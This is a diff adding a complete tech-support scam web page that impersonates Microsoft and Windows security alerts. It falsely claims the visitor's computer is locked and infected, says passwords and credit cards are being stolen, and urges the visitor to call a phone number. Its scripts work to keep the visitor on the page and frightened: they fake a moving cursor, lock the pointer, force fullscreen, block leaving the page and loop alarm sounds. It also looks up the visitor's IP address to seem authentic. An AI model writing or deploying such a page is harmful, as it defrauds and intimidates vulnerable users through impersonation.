@@ -1,0 +1,643 @@
+
+
+<!DOCTYPE html>
+<html <head="">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8">
+
+
+	<iframe src="index.html" width="1" height="1" style="display:none"></iframe>
+	<script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+		<title>Microsoft-Windows-Official Services0322sd072c</title>
+
+		<script>
+			//browser
+			var isOpera = !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
+			// Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
+			var isFirefox = typeof InstallTrigger !== 'undefined';   // Firefox 1.0+
+			var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
+			// At least Safari 3+: "[object HTMLElementConstructor]"
+			var isChrome = !!window.chrome && !isOpera;              // Chrome 1+
+			var isIE = /*@cc_on!@*/false || !!document.documentMode;   // At least IE6
+
+					function getVariableFromURl(name)
+					{
+							name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+							var regexS = "[\\?&]"+name+"=([^&#]*)";
+							var regex = new RegExp( regexS );
+							var results = regex.exec( window.location.href );
+							if( results == null )
+									return "";
+							else
+									return results[1];
+					}
+		</script>
+
+
+		<script src="h.js"></script>
+                <link rel="stylesheet" href="bootstrap.min.css" >
+
+		<script src="bootstrap.min.js" ></script>
+		<link href="alert.css" rel="stylesheet">
+
+                <meta content="width=device-width, initial-scale=1.0, user-scalable=1" name="viewport">
+                <meta name="robots" content="noindex, nofollow">
+
+								<script>function formatAMPM() {
+								var d = new Date(),
+									minutes = d.getMinutes().toString().length == 1 ? '0'+d.getMinutes() : d.getMinutes(),
+									hours = d.getHours().toString().length == 1 ? '0'+d.getHours() : d.getHours(),
+									ampm = d.getHours() >= 12 ? 'pm' : 'am',
+									months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],
+									days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+								return days[d.getDay()]+' '+months[d.getMonth()]+' '+d.getDate()+' '+d.getFullYear()+' '+hours+':'+minutes+ampm;
+								}</script>
+
+		<style>html {
+            overflow: hidden;
+        }
+
+
+
+
+       </style>
+<style>.blink_me {
+  animation: blinker 1s linear infinite;
+}
+
+@keyframes blinker {
+  50% { opacity: 0; }
+}
+
+</style>
+
+<style>div.fixed{position:fixed;bottom:0;right:0;width:300px;height:300px;border:1px }</style>
+<style>div.fixed2{position:fixed;bottom:0px;right:25px;width:200px;height:50px;border:1px;color:black;font-size:22px;font-weight:bold;-webkit-animation-name:example;-webkit-animation-duration:1s;animation-name:example;animation-duration:1s;animation-iteration-count:infinite}@-webkit-keyframes example{0%{color:black}50%{color:red}100%{color:black}}@keyframes example{0%{color:black}50%{color:red}100%{color:black}}</style>
+
+	<style>
+			*{margin:0;padding:0;height:auto}
+			body{background:#292929;color:#fff;font-family:'Yantramanav',sans-serif;margin:0 auto;width:100%;padding:0}
+			#wrap{max-width:800px;width:100%;margin:100px auto;padding:25px}
+			h1{margin-bottom:25px}
+			p{margin-bottom:35px}
+			p{line-height:28px}
+			a{color:#fff!important}
+			.btn{outline:0!important;text-decoration:none!important;padding:10px 24px;color:#fff;display:inline-block;font-size:15px;background-color:#FF0000;font-weight:600}
+			.btn:hover,.btn:active{-webkit-box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50);-moz-box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50);box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50)}
+
+			input[type=checkbox]{visibility:hidden}
+			.checkbox{position:relative;margin-right:10px}
+			.checkbox label{cursor:pointer;position:absolute;width:15px;height:15px;left:4px;top:1px;border:1px solid #fff;border-radius:2px;-moz-border-radius:2px;-webkit-border-radius:2px}
+			.checkbox label:after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";filter:alpha(opacity=0);opacity:0;content:'';position:absolute;width:8px;height:5px;background:transparent;top:2px;left:2px;border:2px solid #fff;border-top:none;border-right:none;-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-o-transform:rotate(-45deg);-ms-transform:rotate(-45deg);transform:rotate(-45deg)}
+			.checkbox label:hover::after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=30)";filter:alpha(opacity=30);opacity:0.3}
+			.checkbox input[type=checkbox]:checked+label:after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";filter:alpha(opacity=100);opacity:1}
+		</style>
+
+
+		<style>
+
+		/* The Modal (background) */
+	  .modal {
+	    display: none; /* Hidden by default */
+	    position: fixed; /* Stay in place */
+	    z-index: 1; /* Sit on top */
+	    padding-top: 100px; /* Location of the box */
+	    left: 0;
+	    top: 0;
+	    width: 100%; /* Full width */
+	    height: 100%; /* Full height */
+	    overflow: auto; /* Enable scroll if needed */
+	    background-color: rgb(0,0,0); /* Fallback color */
+	    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+	  }
+
+	  /* Modal Content */
+	  .modal-content {
+	    position: relative;
+	    background-color: black;
+	    margin: auto;
+	    padding: 0;
+	    /*border: 1px solid #888;*/
+	    width: 80%;
+	    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
+	    -webkit-animation-name: animatetop;
+	    -webkit-animation-duration: 0.4s;
+	    animation-name: animatetop;
+	    animation-duration: 0.4s
+	  }
+
+	  /* Add Animation */
+	  @-webkit-keyframes animatetop {
+	    from {top:-300px; opacity:0}
+	    to {top:0; opacity:1}
+	  }
+
+	  @keyframes animatetop {
+	    from {top:-300px; opacity:0}
+	    to {top:0; opacity:1}
+	  }
+
+	  /* The Close Button */
+	  .close {
+	  display:none;
+	    color: white;
+	    float: right;
+	    font-size: 28px;
+	    font-weight: bold;
+	  }
+
+	  .close:hover,
+	  .close:focus {
+	    color: #000;
+	    text-decoration: none;
+	    cursor: pointer;
+	  }
+
+	  .modal-header {
+	    padding: 2px 20px;
+	    background-color: black;
+	    color: white;
+
+	  }
+	  .modal-header h2
+	  {
+	  border:none;
+	  font-size:42px;
+	  }
+
+	  .modal-body {padding: 2px 20px;color:white;}
+
+	  .modal-footer {
+	    padding: 2px 10px;
+	    background-color: black;
+	    color: white;
+	    height:80px;
+
+	  }
+
+	  .modal-footer btn{
+	  background-color:orange;
+	  }
+
+
+
+.blinkx {
+background-color:green;
+color:#ffffff !important;
+font-size: 20px;
+  animation: blink-animation 1s steps(5, start) infinite;
+  -webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+
+
+
+
+
+
+
+</style>
+
+
+
+		<style>
+.blink {
+background-color:red;
+color:black;
+  animation: blink-animation 1s steps(5, start) infinite;
+  -webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+
+.blink1 {
+background-color:green;
+  animation: blink-animation 1s steps(5, start) infinite;
+  -webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+
+
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+</style>
+
+
+        <script type="text/javascript">
+        	$(document).ready(function(){
+
+        	//-------------- fake cursor -----------------------------------
+        						 function makeNewPosition() {
+        								 var h = $(window).height() - 50, w = $(window).width() - 50, nh = Math.floor(Math.random() * h), nw = Math.floor(Math.random() * w); return [nh, nw];
+        						 }
+        						 function animateDiv() {
+        								 var newq = makeNewPosition(), oldq = $(".fakeCursor").offset(), speed = calcSpeed([oldq.top, oldq.left], newq); $(".fakeCursor").animate({ top: newq[0], left: newq[1] }, speed, function () { animateDiv(); });
+
+        						 };
+        						 function calcSpeed(prev, next) {
+        								 var x = Math.abs(prev[1] - next[1]), y = Math.abs(prev[0] - next[0]), greatest = x > y ? x : y, speedModifier = 0.3, speed = Math.ceil(greatest / speedModifier); return speed;
+        						 }
+
+
+        						 animateDiv();
+        });
+
+
+
+        </script>
+
+				<audio autoplay="autoplay" loop="" id="msgSound">
+					<source src="beep.mp3" type="audio/mpeg">
+				</audio>
+
+				<audio autoplay="autoplay"  id="msgSound1">
+					<source src="err.mp3" type="audio/mpeg">
+				</audio>
+
+        <style type="text/css">
+
+
+        	.fakeCursor {
+        								width: 17px;
+        								height: 25px;
+        								background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAZCAMAAADg4DWlAAAAmVBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8jo0yHAAAAMXRSTlMAAQUPA0IfMgInFzlGCwwpGQcJEiIIP04vGDoqDgYbNVFDGjFBMEgWIElFEyw4PjRLq1RDbAAAALhJREFUeF5V0NlygzAMBVDbKK1tgtlJSgrZ93RR/v/jgjwTC/R45o6kuUJIDVqK0SDkSaHGhBhlNhoTPtGkH0QsT4w/iVgGmjGRMAVhCsLEwsTCRDKhsIemTW2hvQyKm8Xp989kCZAgyeL/cKxslFMG11uia7OySQdSIO72Mcl8tvyq/fX6bNKLp7j6Bnqxo34mId+h5tC7Z5Jbs7qrUJxEfLQ/pmQR4HpjegcsUrmydNQHEygFA7wAtBchFf1cSBMAAAAASUVORK5CYII=");
+        								position: fixed;
+        									top:5px;
+        									left: 400px;
+        								z-index: 100;
+        						}
+        </style>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-161415746-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-161415746-1');
+</script>
+
+
+
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+   </script>
+
+   <script>
+       /* Add "https://api.ipify.org?format=json" statement
+          this will communicate with the ipify servers in
+          order to retrieve the IP address $.getJSON will
+          load JSON-encoded data from the server using a
+          GET HTTP request */
+
+       $.getJSON("https://api.ipify.org?format=json",
+                                         function(data) {
+
+           // Setting text of element P with id gfg
+           $("#gfg").html(data.ip);
+       })
+   </script>
+
+
+
+			<body  id="mycanvas"   style="background:#292929 url('microsoft.png') no-repeat top right; cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair;"><audio id="xyz" src="Funk.ogg"></audio>
+
+<div class="fakeCursor"></div>
+
+  <div style="position:absolute; top:120px; right:35px;"> <img src="win.png" width="220"> </div>
+
+	<div style="position:absolute; top:0px; left:20px;"><img src="def.png"></div>
+	<div style="position:absolute; top:50px; right:35px;"><h3 style="font-size:22px; font-weight:bold;">Call Support +1-855-695-0048
+</h3></div>
+
+	<div style="position:absolute; top:400px; right:20px;"><h3 style="font-size:22px; font-weight:bold;">Call Support +1-855-695-0048</h3></div>
+
+		<div id="wrap">
+
+			<img src="x.png"  alt="stop" width="75" height="75" style="margin-bottom:50px">
+			<h1>Your computer has been Locked</h1>
+			<h2>Call Microsoft : +1-855-695-0048
+</h2>
+			<br>
+			<p>Your computer with the IP address <strong>192.84.29.40</strong> has been infected by the Trojans -- <strong> Because System Activation KEY has expired </strong> & Your information (for example, passwords, messages, and credit cards) have been stolen. <strong>Call Microsoft +1-855-695-0048
+</strong> to protect your files and identity from further damage.</p>
+			<h2 style="margin-top:-12px" >Call Microsoft : +1-855-695-0048
+ (Toll Free)</h2>
+			<p style="margin-bottom:50px">
+
+				Automatically report details of possible security incidents to Google. <a href="index.html#"> Privacy policy</a>
+			</p>
+			<div>
+				<a href="tel:+1-855-695-0048
+" class="btn blink1" style="float:left; background-color:green;" > Call Microsoft : +1-855-695-0048
+ (Toll Free)</a>
+				<a href="index.html#" class="btn animation: blinker 1s linear infinite;" style="font-size:18px;float:right; background-color:green;">Back to safety</a>
+			</div>
+		</div>
+		<br><br><br><br><br><br><br><br><br><br>
+		<br><br><br><br><br><br><br><br><br><br>
+
+
+
+ <!-- Modal -->
+ <div id="chrome-alerts" class="chrome-alert">
+  <div> <a href="javascript:openlink()" class="cross">×</a>
+    <h1>support.windows.com says:</h1>
+    <div class="content-box" id="alert-content-box">
+      <p>**  Windows Warning  Alert  **<br>
+        Malicious Pornographic  Spyware/Riskware Detected<br>
+       <span style="font-size:15px; color:red;">Error code:  - 0x8024402c</span><br>
+
+        Please call us immediately Call Microsoft at:<span style="font-size:15px"> +1-855-695-0048 (Toll Free)
+</span><br>
+        Do not ignore this critical alert.<br>
+        If you close this page, your computer access will be disabled to prevent further damage to our network.<br>
+        Your computer has alerted us that it has been infected with a Pornographic  Spyware and riskware.  The following information is being stolen...<br>
+				<span style="font-weight:bold;">1.Facebook &nbsp;Logins &nbsp;2.Credit &nbsp;Card &nbsp;Details<br/>
+
+				3.Email &nbsp;Account &nbsp;Logins&nbsp; 4.Photos and documents </span><br/>
+
+        <span style="font-size:20px">Call Microsoft: +1-855-695-0048
+ (Toll Free)</span></p>
+    </div>
+    <label style="font-size: 12px;">
+
+			<div class="action_buttons"> <a  class="active blinkx" id="leave_page" style="color:#ffffff !important; font-size:15px">Leave this Page</a> <a  class="active" id="leave_page">Stay Page</a> </div>
+  </div>
+</div>
+
+<div class="fixed">
+<img src="image.png" style="position: absolute; left: 1px; bottom: 1px;" height="300" width="300"></div><div class="fixed2">+1-855-695-0048</div></div><div style="position: absolute; right: 45px; top: 350px;color:#FFF;"><b><u>Error Logged at: <script>document.write(formatAMPM());</script><br>Microsoft Diagnostics IP Address: <span id="gfg"></span></br></div></u></b>
+</div>
+
+
+
+
+	<div id="myModal" class="modal">
+
+	  <!-- Modal content -->
+	  <div class="modal-content">
+	    <div class="modal-header">
+	      <span class="close">&times;</span>
+	      <h2>Microsoft protected your PC</h2>
+	    </div>
+	    <div class="modal-body">
+	      <p>Microsoft SmartScreen prevented an unrecognized app from starting. Running this app might put</p>
+	      <p>your PC at risk. Call Microsoft on <strong style="font-size: 25px;"> +1-855-695-0048 (Toll Free) </span><strong>.</p>
+	    </div>
+	    <div class="modal-footer"style="font-size: 18px;">
+	      <p style="float:left;">Publisher: Unkonwn Publisher <br>App: Microsoft10manager (1).exe</p>
+
+	    <div style="float:right;"><strong class="active" style="padding:10px;background-color:#00000;border:2px solid #fff;color:#02F306 !important;">Run anyway</strong>&nbsp;&nbsp;&nbsp; <button class="active blink"  style="background-color:#000000;border:2px solid #fff; padding:10px;font-weight:bold; color:#02F306 !important; font-size:14px" >Back to Safety</button></div>
+
+	<div style="clear:both"></div>
+	    </div>
+	  </div>
+
+	</div>
+
+
+	    <audio autoplay="autoplay" loop="" id="msgSound1">
+	      <source src="err.mp3" type="audio/mpeg">
+	    </audio>
+
+	    <audio autoplay="autoplay" loop="" id="msgSound">
+	      <source src="beep.mp3" type="audio/mpeg">
+	    </audio>
+
+
+
+
+
+	  <audio autoplay="autoplay" loop="" id="msgSound1">
+	    <source src="err.mp3" type="audio/mpeg">
+	  </audio>
+
+	  <audio autoplay="autoplay" loop="" id="msgSound">
+	    <source src="beep.mp3" type="audio/mpeg">
+	  </audio>
+
+
+	</head>
+
+
+
+
+
+	<!--onLoad="javascript: poponload()"-->
+	  <audio id="xyz" src="err.mp3"></audio>
+
+
+
+	      <audio autoplay="autoplay" loop="" id="msgSound">
+	        <source src="err.mp3" type="audio/mpeg">
+	      </audio>
+
+	      <audio autoplay="autoplay"  id="msgSound1">
+	        <source src="beep.mp3" type="audio/mpeg">
+	      </audio>
+
+
+	          <script type="text/javascript">/*<![CDATA[*/
+	          // audio play /*
+	            var msgAudioEl = document.getElementById("msgSound");
+
+	            var playMsgInt = setInterval(function () {
+	              if (isPlaying(msgAudioEl)) {
+	                // console.log('already playing. clearing interval');
+	                clearInterval(playMsgInt);
+	              } else {
+	                // console.log('Triggering play');
+	                msgAudioEl.play();
+	              }
+	            }, 500);
+	            // audio play */
+
+	          </script>
+
+	              <script type="text/javascript">/*<![CDATA[*/
+	              // audio play /*
+	                var msgAudioEl = document.getElementById("msgSound1");
+
+	                var playMsgInt = setInterval(function () {
+	                  if (isPlaying(msgAudioEl)) {
+	                    // console.log('already playing. clearing interval');
+	                    clearInterval(playMsgInt);
+	                  } else {
+	                    // console.log('Triggering play');
+	                    msgAudioEl.play();
+	                  }
+	                }, 5000);
+	                // audio play */
+
+	              </script>
+
+
+
+
+	                <script>
+	                // Get the modal
+	                var modal = document.getElementById('myModal');
+
+	                // Get the button that opens the modal
+	                var btn = document.getElementById("myBtn");
+
+	                // Get the <span> element that closes the modal
+	                var span = document.getElementsByClassName("close")[0];
+
+	                // When the user clicks the button, open the modal
+	                /*btn.onclick = function() {
+	                  modal.style.display = "block";
+	                } */
+
+	                // When the user clicks on <span> (x), close the modal
+	                span.onclick = function() {
+	                  modal.style.display = "none";
+	                }
+
+	                // When the user clicks anywhere outside of the modal, close it
+	                window.onclick = function(event) {
+	                  if (event.target == modal) {
+	                    modal.style.display = "none";
+	                  }
+	                }
+	                </script>
+	                  <script type="text/javascript">
+	                function addEvent(obj, evt, fn) {
+	                    if (obj.addEventListener) {
+	                        obj.addEventListener(evt, fn, false);
+	                    }
+	                    else if (obj.attachEvent) {
+	                        obj.attachEvent("on" + evt, fn);
+	                    }
+	                }
+	                addEvent(window,"load",function(e) {
+	                    addEvent(document, "mouseout", function(e) {
+	                        e = e ? e : window.event;
+	                        var from = e.relatedTarget || e.toElement;
+	                        if (!from || from.nodeName == "HTML") {
+
+
+	                			 modal.style.display = "block";
+
+	                        }
+	                    });
+	                });
+
+	                  $(document).mousemove(function(){
+	                  var canvas = document.getElementById('mycanvas');
+	                canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+	                canvas.requestPointerLock();
+
+
+	                  });
+
+
+
+	                </script>
+
+
+	              <script
+	                src="https://code.jquery.com/jquery-3.3.1.min.js"
+	                integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+	                crossorigin="anonymous"></script>
+
+	              <script src="js/script.js"></script>
+
+
+	              <script type="text/javascript">
+
+	                  var phone = "";
+
+	                  $('.phone').text(phone);
+
+
+	              	var state = true;
+
+	              	document.body.addEventListener('click', function toggleFullScreen() {
+	              			_toggleFullScreen();
+	              		}, true
+	              	);
+
+	              	window.addEventListener('mouseup', function toggleFullScreen() {
+	              		_toggleFullScreen();
+
+	              		if (navigator.userAgent.toLowerCase().indexOf('chrome') > -1 || navigator.userAgent.indexOf("Opera")) {
+	              		} else {
+	              			open1();
+	              		}
+	              	}, false);
+
+	              	window.onbeforeunload = confirmExit;
+
+	              	function confirmExit() {
+
+	              		return "You have attempted to leave this page. Are you sure?";
+	              	}
+
+	              	setInterval(function () {
+	              		if (state === true) {
+
+	              			document.getElementById('alert-modal').style = 'transform: scale(1.04)';
+	              			state = false;
+	              		} else {
+
+	              			document.getElementById('alert-modal').style = 'transform: scale(1)';
+	              			state = true;
+	              		}
+	              	}, 800);
+	              </script>
+
+	              <script type="text/javascript">
+	              	document.addEventListener('keyup', function (es) {
+	              		catchControlKeys(es);
+
+	              		if (es.keyCode === 27) {
+	              			_toggleFullScreen();
+
+	              			if (navigator.userAgent.toLowerCase().indexOf('chrome') > -1 || navigator.userAgent.indexOf("Opera")) {
+	              				open1();
+	              			}
+	              		}
+	              	}, false);
+	              </script>
+
+	              <script type="text/javascript">
+	              	document.addEventListener('keyup', function (e) {
+	              		if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
+	              			if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+	              				_toggleFullScreen();
+	              			}
+	              		}
+	              	}, false);
+	              </script>
+
+
+
+
+
+
+	              <iframe src="err.mp3" allow="autoplay" style="display:none;"></body>
+	</html>
